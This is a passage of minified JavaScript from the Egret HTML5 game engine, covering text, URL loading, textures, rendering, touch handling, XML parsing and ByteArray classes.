        a.prototype._remove = function () {
        };
        a.prototype._hide = function () {
        };
        a.prototype._addListeners = function () {
        };
        a.prototype._removeListeners = function () {
        };
        a.prototype._setScale = function (a, b) {
            this._scaleX = a;
            this._scaleY = b
        };
        a.prototype.changePosition = function (a, b) {
        };
        a.prototype._setSize = function (a) {
            this._size = a
        };
        a.prototype._setTextColor = function (a) {
            this._color = a
        };
        a.prototype._setTextFontFamily = function (a) {
            this._fontFamily = a
        };
        a.prototype._setBold = function (a) {
            this._bold = a
        };
        a.prototype._setItalic =
            function (a) {
                this._italic = a
            };
        a.prototype._setTextAlign = function (a) {
            this._textAlign = a
        };
        a.prototype._setVisible = function (a) {
            this._visible = a
        };
        a.prototype._setWidth = function (a) {
        };
        a.prototype._setHeight = function (a) {
        };
        a.prototype._setMultiline = function (a) {
            this._multiline = a
        };
        a.prototype._setMaxChars = function (a) {
            this._maxChars = a
        };
        a.prototype._resetStageText = function () {
        };
        a.create = function () {
            return null
        };
        return a
    }(c.EventDispatcher);
    c.StageText = d;
    d.prototype.__class__ = "egret.StageText"
})(egret || (egret = {}));
(function (c) {
    var d = function () {
        function b() {
        }

        b.GET = "get";
        b.POST = "post";
        return b
    }();
    c.URLRequestMethod = d;
    d.prototype.__class__ = "egret.URLRequestMethod"
})(egret || (egret = {}));
(function (c) {
    var d = function () {
        function b() {
        }

        b.BINARY = "binary";
        b.TEXT = "text";
        b.VARIABLES = "variables";
        b.TEXTURE = "texture";
        b.SOUND = "sound";
        return b
    }();
    c.URLLoaderDataFormat = d;
    d.prototype.__class__ = "egret.URLLoaderDataFormat"
})(egret || (egret = {}));
__extends = this.__extends || function (c, d) {
    function b() {
        this.constructor = c
    }

    for (var a in d)d.hasOwnProperty(a) && (c[a] = d[a]);
    b.prototype = d.prototype;
    c.prototype = new b
};
(function (c) {
    var d = function (b) {
        function a(a) {
            void 0 === a && (a = null);
            b.call(this);
            this.variables = null;
            null !== a && this.decode(a)
        }

        __extends(a, b);
        a.prototype.decode = function (a) {
            this.variables || (this.variables = {});
            a = a.split("+").join(" ");
            for (var b, c = /[?&]?([^=]+)=([^&]*)/g; b = c.exec(a);) {
                var d = decodeURIComponent(b[1]);
                b = decodeURIComponent(b[2]);
                if (!1 == d in this.variables)this.variables[d] = b; else {
                    var f = this.variables[d];
                    f instanceof Array ? f.push(b) : this.variables[d] = [f, b]
                }
            }
        };
        a.prototype.toString = function () {
            if (!this.variables)return "";
            var a = this.variables, b = [], c;
            for (c in a)b.push(this.encodeValue(c, a[c]));
            return b.join("&")
        };
        a.prototype.encodeValue = function (a, b) {
            return b instanceof Array ? this.encodeArray(a, b) : encodeURIComponent(a) + "=" + encodeURIComponent(b)
        };
        a.prototype.encodeArray = function (a, b) {
            return a ? 0 == b.length ? encodeURIComponent(a) + "=" : b.map(function (b) {
                return encodeURIComponent(a) + "=" + encodeURIComponent(b)
            }).join("&") : ""
        };
        return a
    }(c.HashObject);
    c.URLVariables = d;
    d.prototype.__class__ = "egret.URLVariables"
})(egret || (egret =
{}));
(function (c) {
    var d = function () {
        return function (b, a) {
            this.value = this.name = "";
            this.name = b;
            this.value = a
        }
    }();
    c.URLRequestHeader = d;
    d.prototype.__class__ = "egret.URLRequestHeader"
})(egret || (egret = {}));
__extends = this.__extends || function (c, d) {
    function b() {
        this.constructor = c
    }

    for (var a in d)d.hasOwnProperty(a) && (c[a] = d[a]);
    b.prototype = d.prototype;
    c.prototype = new b
};
(function (c) {
    var d = function (b) {
        function a(a) {
            void 0 === a && (a = null);
            b.call(this);
            this.data = null;
            this.method = c.URLRequestMethod.GET;
            this.url = "";
            this.url = a
        }

        __extends(a, b);
        return a
    }(c.HashObject);
    c.URLRequest = d;
    d.prototype.__class__ = "egret.URLRequest"
})(egret || (egret = {}));
__extends = this.__extends || function (c, d) {
    function b() {
        this.constructor = c
    }

    for (var a in d)d.hasOwnProperty(a) && (c[a] = d[a]);
    b.prototype = d.prototype;
    c.prototype = new b
};
(function (c) {
    var d = function (b) {
        function a(a) {
            void 0 === a && (a = null);
            b.call(this);
            this.dataFormat = c.URLLoaderDataFormat.TEXT;
            this._request = this.data = null;
            this._status = -1;
            a && this.load(a)
        }

        __extends(a, b);
        a.prototype.load = function (a) {
            this._request = a;
            this.data = null;
            c.MainContext.instance.netContext.proceed(this)
        };
        return a
    }(c.EventDispatcher);
    c.URLLoader = d;
    d.prototype.__class__ = "egret.URLLoader"
})(egret || (egret = {}));
__extends = this.__extends || function (c, d) {
    function b() {
        this.constructor = c
    }

    for (var a in d)d.hasOwnProperty(a) && (c[a] = d[a]);
    b.prototype = d.prototype;
    c.prototype = new b
};
(function (c) {
    var d = function (b) {
        function a() {
            b.call(this);
            this._sourceHeight = this._sourceWidth = this._textureHeight = this._textureWidth = this._offsetY = this._offsetX = this._bitmapHeight = this._bitmapWidth = this._bitmapY = this._bitmapX = 0;
            this._bitmapData = null
        }

        __extends(a, b);
        Object.defineProperty(a.prototype, "textureWidth", {
            get: function () {
                return this._textureWidth
            }, enumerable: !0, configurable: !0
        });
        Object.defineProperty(a.prototype, "textureHeight", {
            get: function () {
                return this._textureHeight
            }, enumerable: !0, configurable: !0
        });
        Object.defineProperty(a.prototype, "bitmapData", {
            get: function () {
                return this._bitmapData
            }, enumerable: !0, configurable: !0
        });
        a.prototype._setBitmapData = function (a) {
            var b = c.MainContext.instance.rendererContext._texture_scale_factor;
            this._bitmapData = a;
            this._sourceWidth = a.width;
            this._sourceHeight = a.height;
            this._textureWidth = this._sourceWidth * b;
            this._textureHeight = this._sourceHeight * b;
            this._bitmapWidth = this._textureWidth;
            this._bitmapHeight = this._textureHeight;
            this._offsetX = this._offsetY = this._bitmapX = this._bitmapY =
                0
        };
        a.prototype.getPixel32 = function (a, b) {
            return this._bitmapData.getContext("2d").getImageData(a, b, 1, 1).data
        };
        return a
    }(c.HashObject);
    c.Texture = d;
    d.prototype.__class__ = "egret.Texture"
})(egret || (egret = {}));
__extends = this.__extends || function (c, d) {
    function b() {
        this.constructor = c
    }

    for (var a in d)d.hasOwnProperty(a) && (c[a] = d[a]);
    b.prototype = d.prototype;
    c.prototype = new b
};
(function (c) {
    var d = function (b) {
        function a() {
            b.call(this)
        }

        __extends(a, b);
        a.prototype.init = function () {
            this._bitmapData = document.createElement("canvas");
            this.renderContext = c.RendererContext.createRendererContext(this._bitmapData)
        };
        a.prototype.drawToTexture = function (b, d, n) {
            var h = d || b.getBounds(c.Rectangle.identity);
            if (0 == h.width || 0 == h.height)return !1;
            this._bitmapData || this.init();
            var f = h.x, g = h.y;
            d = h.width;
            var h = h.height, k = c.MainContext.instance.rendererContext._texture_scale_factor, h = h / k;
            d = Math.round(d /
            k);
            h = Math.round(h);
            this.setSize(d, h);
            this.begin();
            b._worldTransform.identity();
            b._worldTransform.a = 1 / k;
            b._worldTransform.d = 1 / k;
            n && (b._worldTransform.a *= n, b._worldTransform.d *= n);
            n = b._anchorOffsetX;
            var l = b._anchorOffsetY;
            if (0 != b._anchorX || 0 != b._anchorY)n = b._anchorX * d, l = b._anchorY * h;
            this._offsetX = f + n;
            this._offsetY = g + l;
            b._worldTransform.append(1, 0, 0, 1, -this._offsetX, -this._offsetY);
            b.worldAlpha = 1;
            if (b instanceof c.DisplayObjectContainer)for (f = b._children, g = 0, n = f.length; g < n; g++)f[g]._updateTransform();
            this.renderContext.setTransform(b._worldTransform);
            f = c.RenderFilter.getInstance();
            g = f._drawAreaList.concat();
            f._drawAreaList.length = 0;
            this.renderContext.clearScreen();
            this.renderContext.onRenderStart();
            c.RendererContext.deleteTexture(this);
            b._filter && this.renderContext.setGlobalFilter(b._filter);
            b._colorTransform && this.renderContext.setGlobalColorTransform(b._colorTransform.matrix);
            (n = b.mask || b._scrollRect) && this.renderContext.pushMask(n);
            l = c.MainContext.__use_new_draw;
            c.MainContext.__use_new_draw = !1;
            b._render(this.renderContext);
            c.MainContext.__use_new_draw = l;
            n && this.renderContext.popMask();
            b._colorTransform && this.renderContext.setGlobalColorTransform(null);
            b._filter && this.renderContext.setGlobalFilter(null);
            a.identityRectangle.width = d;
            a.identityRectangle.height = h;
            f.addDrawArea(a.identityRectangle);
            this.renderContext.onRenderFinish();
            f._drawAreaList = g;
            this._sourceWidth = d;
            this._sourceHeight = h;
            this._textureWidth = this._sourceWidth * k;
            this._textureHeight = this._sourceHeight * k;
            this.end();
            return !0
        };
        a.prototype.setSize = function (a, b) {
            var c = this._bitmapData;
            c.width = a;
            c.height = b;
            c.style.width = a + "px";
            c.style.height = b + "px";
            this.renderContext._cacheCanvas && (this.renderContext._cacheCanvas.width = a, this.renderContext._cacheCanvas.height = b)
        };
        a.prototype.begin = function () {
        };
        a.prototype.end = function () {
        };
        a.prototype.dispose = function () {
            this._bitmapData && (this.renderContext = this._bitmapData = null)
        };
        a.identityRectangle = new c.Rectangle;
        return a
    }(c.Texture);
    c.RenderTexture = d;
    d.prototype.__class__ = "egret.RenderTexture"
})(egret ||
(egret = {}));
__extends = this.__extends || function (c, d) {
    function b() {
        this.constructor = c
    }

    for (var a in d)d.hasOwnProperty(a) && (c[a] = d[a]);
    b.prototype = d.prototype;
    c.prototype = new b
};
(function (c) {
    var d = function (b) {
        function a() {
            b.call(this);
            this.renderCost = 0;
            this._texture_scale_factor = 1;
            this.profiler = c.Profiler.getInstance();
            a.blendModesForGL || a.initBlendMode()
        }

        __extends(a, b);
        Object.defineProperty(a.prototype, "texture_scale_factor", {
            get: function () {
                return this._texture_scale_factor
            }, set: function (a) {
                this._setTextureScaleFactor(a)
            }, enumerable: !0, configurable: !0
        });
        a.prototype._setTextureScaleFactor = function (a) {
            this._texture_scale_factor = a
        };
        a.prototype.clearScreen = function () {
        };
        a.prototype.clearRect =
            function (a, b, c, d) {
            };
        a.prototype.drawImage = function (a, b, c, d, f, g, k, l, m, p) {
            this.profiler.onDrawImage()
        };
        a.prototype.drawImageScale9 = function (a, b, c, d, f, g, k, l, m, p) {
            return !1
        };
        a.prototype._addOneDraw = function () {
            this.profiler.onDrawImage()
        };
        a.prototype.setTransform = function (a) {
        };
        a.prototype.setAlpha = function (a, b) {
        };
        a.prototype.setupFont = function (a, b) {
        };
        a.prototype.measureText = function (a) {
            return 0
        };
        a.prototype.drawText = function (a, b, c, d, f, g) {
            this.profiler.onDrawImage()
        };
        a.prototype.strokeRect = function (a, b,
                                           c, d, f) {
        };
        a.prototype.pushMask = function (a) {
        };
        a.prototype.popMask = function () {
        };
        a.prototype.onRenderStart = function () {
        };
        a.prototype.onRenderFinish = function () {
        };
        a.prototype.setGlobalColorTransform = function (a) {
        };
        a.prototype.setGlobalFilter = function (a) {
        };
        a.createRendererContext = function (a) {
            return null
        };
        a.deleteTexture = function (a) {
            var b = c.MainContext.instance.rendererContext.gl;
            if (a = a._bitmapData) {
                var d = a.webGLTexture;
                if (d && b)for (var h in d)b.deleteTexture(d[h]);
                a.webGLTexture = null
            }
        };
        a.initBlendMode = function () {
            a.blendModesForGL =
            {};
            a.blendModesForGL[c.BlendMode.NORMAL] = [1, 771];
            a.blendModesForGL[c.BlendMode.ADD] = [770, 1]
        };
        a.registerBlendModeForGL = function (b, d, n, h) {
            a.blendModesForGL[b] && !h ? c.Logger.warningWithErrorId(1005, b) : a.blendModesForGL[b] = [d, n]
        };
        a.imageSmoothingEnabled = !0;
        a.blendModesForGL = null;
        return a
    }(c.HashObject);
    c.RendererContext = d;
    d.prototype.__class__ = "egret.RendererContext"
})(egret || (egret = {}));
(function (c) {
    var d = function () {
        function b() {
        }

        b.MOUSE = "mouse";
        b.TOUCH = "touch";
        b.mode = "touch";
        return b
    }();
    c.InteractionMode = d;
    d.prototype.__class__ = "egret.InteractionMode"
})(egret || (egret = {}));
__extends = this.__extends || function (c, d) {
    function b() {
        this.constructor = c
    }

    for (var a in d)d.hasOwnProperty(a) && (c[a] = d[a]);
    b.prototype = d.prototype;
    c.prototype = new b
};
(function (c) {
    var d = function (b) {
        function a() {
            b.call(this);
            this._currentTouchTarget = {};
            this.maxTouches = 2;
            this.touchDownTarget = {};
            this.touchingIdentifiers = [];
            this.lastTouchY = this.lastTouchX = -1
        }

        __extends(a, b);
        a.prototype.run = function () {
        };
        a.prototype.getTouchData = function (a, b, c) {
            var d = this._currentTouchTarget[a];
            null == d && (d = {}, this._currentTouchTarget[a] = d);
            d.stageX = b;
            d.stageY = c;
            d.identifier = a;
            return d
        };
        a.prototype.dispatchEvent = function (a, b) {
            c.TouchEvent.dispatchTouchEvent(b.target, a, b.identifier, b.stageX,
                b.stageY, !1, !1, !1, !0 == this.touchDownTarget[b.identifier])
        };
        a.prototype.onTouchBegan = function (a, b, d) {
            if (this.touchingIdentifiers.length != this.maxTouches) {
                var h = c.MainContext.instance.stage.hitTest(a, b);
                h && (a = this.getTouchData(d, a, b), this.touchDownTarget[d] = !0, a.target = h, a.beginTarget = h, this.dispatchEvent(c.TouchEvent.TOUCH_BEGIN, a));
                this.touchingIdentifiers.push(d)
            }
        };
        a.prototype.onTouchMove = function (a, b, d) {
            if (-1 != this.touchingIdentifiers.indexOf(d) && (a != this.lastTouchX || b != this.lastTouchY)) {
                this.lastTouchX =
                    a;
                this.lastTouchY = b;
                var h = c.MainContext.instance.stage.hitTest(a, b);
                h && (a = this.getTouchData(d, a, b), a.target = h, this.dispatchEvent(c.TouchEvent.TOUCH_MOVE, a))
            }
        };
        a.prototype.onTouchEnd = function (a, b, d) {
            var h = this.touchingIdentifiers.indexOf(d);
            -1 != h && (this.touchingIdentifiers.splice(h, 1), h = c.MainContext.instance.stage.hitTest(a, b)) && (a = this.getTouchData(d, a, b), delete this.touchDownTarget[d], d = a.beginTarget, a.target = h, this.dispatchEvent(c.TouchEvent.TOUCH_END, a), d == h ? this.dispatchEvent(c.TouchEvent.TOUCH_TAP,
                a) : a.beginTarget && (a.target = a.beginTarget, this.dispatchEvent(c.TouchEvent.TOUCH_RELEASE_OUTSIDE, a)), delete this._currentTouchTarget[a.identifier])
        };
        return a
    }(c.HashObject);
    c.TouchContext = d;
    d.prototype.__class__ = "egret.TouchContext"
})(egret || (egret = {}));
__extends = this.__extends || function (c, d) {
    function b() {
        this.constructor = c
    }

    for (var a in d)d.hasOwnProperty(a) && (c[a] = d[a]);
    b.prototype = d.prototype;
    c.prototype = new b
};
(function (c) {
    var d = function (b) {
        function a() {
            b.call(this)
        }

        __extends(a, b);
        a.prototype.proceed = function (a) {
        };
        a._getUrl = function (a) {
            var b = a.url;
            -1 == b.indexOf("?") && a.method == c.URLRequestMethod.GET && a.data && a.data instanceof c.URLVariables && (b = b + "?" + a.data.toString());
            return b
        };
        a.prototype.getChangeList = function () {
            return []
        };
        return a
    }(c.HashObject);
    c.NetContext = d;
    d.prototype.__class__ = "egret.NetContext"
})(egret || (egret = {}));
__extends = this.__extends || function (c, d) {
    function b() {
        this.constructor = c
    }

    for (var a in d)d.hasOwnProperty(a) && (c[a] = d[a]);
    b.prototype = d.prototype;
    c.prototype = new b
};
(function (c) {
    var d = function (b) {
        function a() {
            b.call(this);
            this.frameRate = 60
        }

        __extends(a, b);
        a.prototype.executeMainLoop = function (a, b) {
        };
        return a
    }(c.HashObject);
    c.DeviceContext = d;
    d.prototype.__class__ = "egret.DeviceContext"
})(egret || (egret = {}));
(function (c) {
    var d = function () {
        function b() {
        }

        b.call = function (a, b) {
        };
        b.addCallback = function (a, b) {
        };
        return b
    }();
    c.ExternalInterface = d;
    d.prototype.__class__ = "egret.ExternalInterface"
})(egret || (egret = {}));
__extends = this.__extends || function (c, d) {
    function b() {
        this.constructor = c
    }

    for (var a in d)d.hasOwnProperty(a) && (c[a] = d[a]);
    b.prototype = d.prototype;
    c.prototype = new b
};
(function (c) {
    var d = function (b) {
        function a() {
            b.call(this);
            this.trans = null;
            this.ua = navigator.userAgent.toLowerCase();
            this.trans = this._getTrans()
        }

        __extends(a, b);
        a.getInstance = function () {
            null == a.instance && (a.instance = new a);
            return a.instance
        };
        Object.defineProperty(a.prototype, "isMobile", {
            get: function () {
                c.Logger.warningWithErrorId(1E3);
                return c.MainContext.deviceType == c.MainContext.DEVICE_MOBILE
            }, enumerable: !0, configurable: !0
        });
        a.prototype._getHeader = function (a) {
            if ("transform"in a)return "";
            for (var b = ["webkit",
                "ms", "Moz", "O"], c = 0; c < b.length; c++)if (b[c] + "Transform"in a)return b[c];
            return ""
        };
        a.prototype._getTrans = function () {
            var a = document.createElement("div").style, a = this._getHeader(a);
            return "" == a ? "transform" : a + "Transform"
        };
        a.prototype.$new = function (a) {
            return this.$(document.createElement(a))
        };
        a.prototype.$ = function (b) {
            var d = document;
            if (b = b instanceof HTMLElement ? b : d.querySelector(b))b.find = b.find || this.$, b.hasClass = b.hasClass || function (a) {
                return this.className.match(new RegExp("(\\s|^)" + a + "(\\s|$)"))
            }, b.addClass =
                b.addClass || function (a) {
                    this.hasClass(a) || (this.className && (this.className += " "), this.className += a);
                    return this
                }, b.removeClass = b.removeClass || function (a) {
                this.hasClass(a) && (this.className = this.className.replace(a, ""));
                return this
            }, b.remove = b.remove || function () {
            }, b.appendTo = b.appendTo || function (a) {
                a.appendChild(this);
                return this
            }, b.prependTo = b.prependTo || function (a) {
                a.childNodes[0] ? a.insertBefore(this, a.childNodes[0]) : a.appendChild(this);
                return this
            }, b.transforms = b.transforms || function () {
                this.style[a.getInstance().trans] =
                    a.getInstance().translate(this.position) + a.getInstance().rotate(this.rotation) + a.getInstance().scale(this.scale) + a.getInstance().skew(this.skew);
                return this
            }, b.position = b.position || {x: 0, y: 0}, b.rotation = b.rotation || 0, b.scale = b.scale || {
                x: 1,
                y: 1
            }, b.skew = b.skew || {x: 0, y: 0}, b.translates = function (a, b) {
                this.position.x = a;
                this.position.y = b - c.MainContext.instance.stage.stageHeight;
                this.transforms();
                return this
            }, b.rotate = function (a) {
                this.rotation = a;
                this.transforms();
                return this
            }, b.resize = function (a, b) {
                this.scale.x =
                    a;
                this.scale.y = b;
                this.transforms();
                return this
            }, b.setSkew = function (a, b) {
                this.skew.x = a;
                this.skew.y = b;
                this.transforms();
                return this
            };
            return b
        };
        a.prototype.translate = function (a) {
            return "translate(" + a.x + "px, " + a.y + "px) "
        };
        a.prototype.rotate = function (a) {
            return "rotate(" + a + "deg) "
        };
        a.prototype.scale = function (a) {
            return "scale(" + a.x + ", " + a.y + ") "
        };
        a.prototype.skew = function (a) {
            return "skewX(" + -a.x + "deg) skewY(" + a.y + "deg)"
        };
        return a
    }(c.HashObject);
    c.Browser = d;
    d.prototype.__class__ = "egret.Browser"
})(egret || (egret =
{}));
(function (c) {
    (function (c) {
        c.getItem = function (b) {
            return null
        };
        c.setItem = function (b, a) {
            return !1
        };
        c.removeItem = function (b) {
        };
        c.clear = function () {
        }
    })(c.localStorage || (c.localStorage = {}))
})(egret || (egret = {}));
(function (c) {
    var d = function () {
        function b() {
        }

        b.parse = function (a) {
            a = c.SAXParser.getInstance().parserXML(a);
            if (!a || !a.childNodes)return null;
            for (var e = a.childNodes.length, d = !1, n = 0; n < e; n++) {
                var h = a.childNodes[n];
                if (1 == h.nodeType) {
                    d = !0;
                    break
                }
            }
            return d ? b.parseNode(h) : null
        };
        b.parseNode = function (a) {
            if (!a || 1 != a.nodeType)return null;
            var e = {};
            e.localName = a.localName;
            e.name = a.nodeName;
            a.namespaceURI && (e.namespace = a.namespaceURI);
            a.prefix && (e.prefix = a.prefix);
            for (var c = a.attributes, d = c.length, h = 0; h < d; h++) {
                var f =
                    c[h], g = f.name;
                0 != g.indexOf("xmlns:") && (e["$" + g] = f.value)
            }
            c = a.childNodes;
            d = c.length;
            for (h = 0; h < d; h++)if (f = b.parseNode(c[h]))e.children || (e.children = []), f.parent = e, e.children.push(f);
            !e.children && (a = a.textContent.trim()) && (e.text = a);
            return e
        };
        b.findChildren = function (a, e, c) {
            c ? c.length = 0 : c = [];
            b.findByPath(a, e, c);
            return c
        };
        b.findByPath = function (a, e, c) {
            var d = e.indexOf("."), h;
            -1 == d ? (h = e, d = !0) : (h = e.substring(0, d), e = e.substring(d + 1), d = !1);
            if (a = a.children)for (var f = a.length, g = 0; g < f; g++) {
                var k = a[g];
                k.localName ==
                h && (d ? c.push(k) : b.findByPath(k, e, c))
            }
        };
        b.getAttributes = function (a, b) {
            b ? b.length = 0 : b = [];
            for (var c in a)"$" == c.charAt(0) && b.push(c.substring(1));
            return b
        };
        return b
    }();
    c.XML = d;
    d.prototype.__class__ = "egret.XML"
})(egret || (egret = {}));
(function (c) {
    var d = function () {
        function a() {
        }

        a.LITTLE_ENDIAN = "LITTLE_ENDIAN";
        a.BIG_ENDIAN = "BIG_ENDIAN";
        return a
    }();
    c.Endian = d;
    d.prototype.__class__ = "egret.Endian";
    var b = function () {
        function a(a) {
            this.BUFFER_EXT_SIZE = 0;
            this.EOF_code_point = this.EOF_byte = -1;
            this._setArrayBuffer(a || new ArrayBuffer(this.BUFFER_EXT_SIZE));
            this.endian = d.BIG_ENDIAN
        }

        a.prototype._setArrayBuffer = function (a) {
            this.write_position = a.byteLength;
            this.data = new DataView(a, 0, a.byteLength);
            this._position = 0
        };
        a.prototype.setArrayBuffer = function (a) {
        };
        Object.defineProperty(a.prototype, "buffer", {
            get: function () {
                return this.data.buffer
            }, set: function (a) {
                this.data = new DataView(a)
            }, enumerable: !0, configurable: !0
        });
        Object.defineProperty(a.prototype, "dataView", {
            get: function () {
                return this.data
            }, set: function (a) {
                this.data = a;
                this.write_position = a.byteLength
            }, enumerable: !0, configurable: !0
        });
        Object.defineProperty(a.prototype, "bufferOffset", {
            get: function () {
                return this.data.byteOffset
            }, enumerable: !0, configurable: !0
        });
        Object.defineProperty(a.prototype, "position",
            {
                get: function () {
                    return this._position
                }, set: function (a) {
                this._position < a && !this.validate(this._position - a) || (this._position = a, this.write_position = a > this.write_position ? a : this.write_position)
            }, enumerable: !0, configurable: !0
            });
        Object.defineProperty(a.prototype, "length", {
            get: function () {
                return this.write_position
            }, set: function (a) {
                this.validateBuffer(a)
            }, enumerable: !0, configurable: !0
        });
        Object.defineProperty(a.prototype, "bytesAvailable", {
            get: function () {
                return this.data.byteLength - this._position
            }, enumerable: !0,
            configurable: !0
        });
        a.prototype.clear = function () {
            this._setArrayBuffer(new ArrayBuffer(this.BUFFER_EXT_SIZE))
        };
        a.prototype.readBoolean = function () {
            return this.validate(a.SIZE_OF_BOOLEAN) ? 0 != this.data.getUint8(this.position++) : null
        };
        a.prototype.readByte = function () {
            return this.validate(a.SIZE_OF_INT8) ? this.data.getInt8(this.position++) : null
        };
        a.prototype.readBytes = function (a, b, c) {
            void 0 === c && (c = 0);
            if (0 == c)c = this.bytesAvailable; else if (!this.validate(c))return null;
            a.dataView = new DataView(this.data.buffer,
                this.bufferOffset + this.position, c);
            this.position += c
        };
        a.prototype.readDouble = function () {
            if (!this.validate(a.SIZE_OF_FLOAT64))return null;
            var b = this.data.getFloat64(this.position, this.endian == d.LITTLE_ENDIAN);
            this.position += a.SIZE_OF_FLOAT64;
            return b
        };
        a.prototype.readFloat = function () {
            if (!this.validate(a.SIZE_OF_FLOAT32))return null;
            var b = this.data.getFloat32(this.position, this.endian == d.LITTLE_ENDIAN);
            this.position += a.SIZE_OF_FLOAT32;
            return b
        };
        a.prototype.readInt = function () {
            if (!this.validate(a.SIZE_OF_INT32))return null;
            var b = this.data.getInt32(this.position, this.endian == d.LITTLE_ENDIAN);
            this.position += a.SIZE_OF_INT32;
            return b
        };
        a.prototype.readMultiByte = function (a, b) {
            return this.validate(a) ? "" : null
        };
        a.prototype.readShort = function () {
            if (!this.validate(a.SIZE_OF_INT16))return null;
            var b = this.data.getInt16(this.position, this.endian == d.LITTLE_ENDIAN);
            this.position += a.SIZE_OF_INT16;
            return b
        };
        a.prototype.readUnsignedByte = function () {
            return this.validate(a.SIZE_OF_UINT8) ? this.data.getUint8(this.position++) : null
        };
        a.prototype.readUnsignedInt =
            function () {
                if (!this.validate(a.SIZE_OF_UINT32))return null;
                var b = this.data.getUint32(this.position, this.endian == d.LITTLE_ENDIAN);
                this.position += a.SIZE_OF_UINT32;
                return b
            };
        a.prototype.readUnsignedShort = function () {
            if (!this.validate(a.SIZE_OF_UINT16))return null;
            var b = this.data.getUint16(this.position, this.endian == d.LITTLE_ENDIAN);
            this.position += a.SIZE_OF_UINT16;
            return b
        };
        a.prototype.readUTF = function () {
            if (!this.validate(a.SIZE_OF_UINT16))return null;
            var b = this.data.getUint16(this.position, this.endian ==
            d.LITTLE_ENDIAN);
            this.position += a.SIZE_OF_UINT16;
            return 0 < b ? this.readUTFBytes(b) : ""
        };
        a.prototype.readUTFBytes = function (a) {
            if (!this.validate(a))return null;
            var b = new Uint8Array(this.buffer, this.bufferOffset + this.position, a);
            this.position += a;
            return this.decodeUTF8(b)
        };
        a.prototype.writeBoolean = function (b) {
            this.validateBuffer(a.SIZE_OF_BOOLEAN);
            this.data.setUint8(this.position++, b ? 1 : 0)
        };
        a.prototype.writeByte = function (b) {
            this.validateBuffer(a.SIZE_OF_INT8);
            this.data.setInt8(this.position++, b)
        };
        a.prototype.writeBytes =
            function (a, b, c) {
                void 0 === c && (c = 0);
                this.validateBuffer(c);
                b = new DataView(a.buffer);
                for (c = 0; c < a.length; c++)this.data.setUint8(this.position++, b.getUint8(c))
            };
        a.prototype.writeDouble = function (b) {
            this.validateBuffer(a.SIZE_OF_FLOAT64);
            this.data.setFloat64(this.position, b, this.endian == d.LITTLE_ENDIAN);
            this.position += a.SIZE_OF_FLOAT64
        };
        a.prototype.writeFloat = function (b) {
            this.validateBuffer(a.SIZE_OF_FLOAT32);
            this.data.setFloat32(this.position, b, this.endian == d.LITTLE_ENDIAN);
            this.position += a.SIZE_OF_FLOAT32
        };
        a.prototype.writeInt = function (b) {
            this.validateBuffer(a.SIZE_OF_INT32);
            this.data.setInt32(this.position, b, this.endian == d.LITTLE_ENDIAN);
            this.position += a.SIZE_OF_INT32
        };
        a.prototype.writeShort = function (b) {
            this.validateBuffer(a.SIZE_OF_INT16);
            this.data.setInt16(this.position, b, this.endian == d.LITTLE_ENDIAN);
            this.position += a.SIZE_OF_INT16
        };
        a.prototype.writeUnsignedInt = function (b) {
            this.validateBuffer(a.SIZE_OF_UINT32);
            this.data.setUint32(this.position, b, this.endian == d.LITTLE_ENDIAN);
            this.position += a.SIZE_OF_UINT32
        };
        a.prototype.writeUTF = function (b) {
            b = this.encodeUTF8(b);
            var c = b.length;
            this.validateBuffer(a.SIZE_OF_UINT16 + c);
            this.data.setUint16(this.position, c, this.endian === d.LITTLE_ENDIAN);
            this.position += a.SIZE_OF_UINT16;
            this._writeUint8Array(b)
        };
        a.prototype.writeUTFBytes = function (a) {
            this._writeUint8Array(this.encodeUTF8(a))
        };
        a.prototype.toString = function () {
            return "[ByteArray] length:" + this.length + ", bytesAvailable:" + this.bytesAvailable
        };
        a.prototype._writeUint8Array = function (a) {
            this.validateBuffer(this.position +
            a.length);
            for (var b = 0; b < a.length; b++)this.data.setUint8(this.position++, a[b])
        };
        a.prototype.validate = function (a) {
            if (0 < this.data.byteLength && this._position + a <= this.data.byteLength)return !0;
            throw c.getString(1025);
        };
        a.prototype.validateBuffer = function (a) {
            this.write_position = a > this.write_position ? a : this.write_position;
            a += this._position;
            this.data.byteLength < a && (a = new Uint8Array(new ArrayBuffer(a + this.BUFFER_EXT_SIZE)), a.set(new Uint8Array(this.data.buffer)), this.buffer = a.buffer)
        };
        a.prototype.encodeUTF8 =
            function (a) {
                var b = 0;
                a = this.stringToCodePoints(a);
                for (var c = []; a.length > b;) {
                    var d = a[b++];
                    if (this.inRange(d, 55296, 57343))this.encoderError(d); else if (this.inRange(d, 0, 127))c.push(d); else {
                        var f, g;
                        this.inRange(d, 128, 2047) ? (f = 1, g = 192) : this.inRange(d, 2048, 65535) ? (f = 2, g = 224) : this.inRange(d, 65536, 1114111) && (f = 3, g = 240);
                        for (c.push(this.div(d, Math.pow(64, f)) + g); 0 < f;) {
                            var k = this.div(d, Math.pow(64, f - 1));
                            c.push(128 + k % 64);
                            f -= 1
                        }
                    }
                }
                return new Uint8Array(c)
            };
        a.prototype.decodeUTF8 = function (a) {
            for (var b = 0, c = "", d, f = 0,
                     g = 0, k = 0, l = 0; a.length > b;) {
                d = a[b++];
                if (d === this.EOF_byte)d = 0 !== g ? this.decoderError(!1) : this.EOF_code_point; else if (0 === g)this.inRange(d, 0, 127) || (this.inRange(d, 194, 223) ? (g = 1, l = 128, f = d - 192) : this.inRange(d, 224, 239) ? (g = 2, l = 2048, f = d - 224) : this.inRange(d, 240, 244) ? (g = 3, l = 65536, f = d - 240) : this.decoderError(!1), f *= Math.pow(64, g), d = null); else if (this.inRange(d, 128, 191))if (k += 1, f += (d - 128) * Math.pow(64, g - k), k !== g)d = null; else {
                    var m = f, p = l, l = k = g = f = 0;
                    d = this.inRange(m, p, 1114111) && !this.inRange(m, 55296, 57343) ? m : this.decoderError(!1,
                        d)
                } else l = k = g = f = 0, b--, d = this.decoderError(!1, d);
                null !== d && d !== this.EOF_code_point && (65535 >= d ? 0 < d && (c += String.fromCharCode(d)) : (d -= 65536, c += String.fromCharCode(55296 + (d >> 10 & 1023)), c += String.fromCharCode(56320 + (d & 1023))))
            }
            return c
        };
        a.prototype.encoderError = function (a) {
            throw c.getString(1026, a);
        };
        a.prototype.decoderError = function (a, b) {
            if (a)throw c.getString(1027);
            return b || 65533
        };
        a.prototype.inRange = function (a, b, c) {
            return b <= a && a <= c
        };
        a.prototype.div = function (a, b) {
            return Math.floor(a / b)
        };
        a.prototype.stringToCodePoints =
            function (a) {
                for (var b = [], c = 0, d = a.length; c < a.length;) {
                    var f = a.charCodeAt(c);
